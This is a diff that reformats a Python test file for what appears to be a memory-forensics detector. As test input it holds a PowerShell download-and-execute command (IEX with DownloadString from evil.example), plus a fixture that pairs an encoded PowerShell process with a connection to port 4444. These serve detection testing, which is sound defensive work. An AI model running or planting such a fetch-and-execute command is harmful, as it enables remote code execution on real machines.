@@ -27,7 +27,9 @@ def _ps_encode(cmd: str) -> str:
 # -- fixture helpers -------------------------------------------------------
 
 
-def _proc(pid: int, name: str, *, ppid: int = 4, exit_time: str | None = None) -> ProcessRow:
+def _proc(
+    pid: int, name: str, *, ppid: int = 4, exit_time: str | None = None
+) -> ProcessRow:
     return ProcessRow(
         pid=pid,
         ppid=ppid,
@@ -236,7 +238,9 @@ def test_cmdline_null_args_skipped() -> None:
 def test_cmdline_encoded_command_decodes_and_fires_high() -> None:
     """`-EncodedCommand <utf16le-base64>` is the canonical T1140 shape
     for PowerShell. We must decode it and surface the decoded payload."""
-    payload = 'IEX(New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")'
+    payload = (
+        'IEX(New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")'
+    )
     encoded = _ps_encode(payload)
     row = _cmdline_row(
         1234,
@@ -587,7 +591,11 @@ def test_analyze_aggregates_across_streams() -> None:
     psscan = [_proc(1234, "explorer.exe"), _proc(9999, "rootkit.exe")]
     malfind = [_malfind_row(1234)]
     cmdline = [_cmdline_row(1234, "powershell.exe", "powershell -enc aGk=")]
-    netscan = [_netscan_row(owner="powershell.exe", foreign_addr="203.0.113.9", foreign_port=4444)]
+    netscan = [
+        _netscan_row(
+            owner="powershell.exe", foreign_addr="203.0.113.9", foreign_port=4444
+        )
+    ]
 
     findings = MemoryDetector().analyze(
         pslist=pslist,
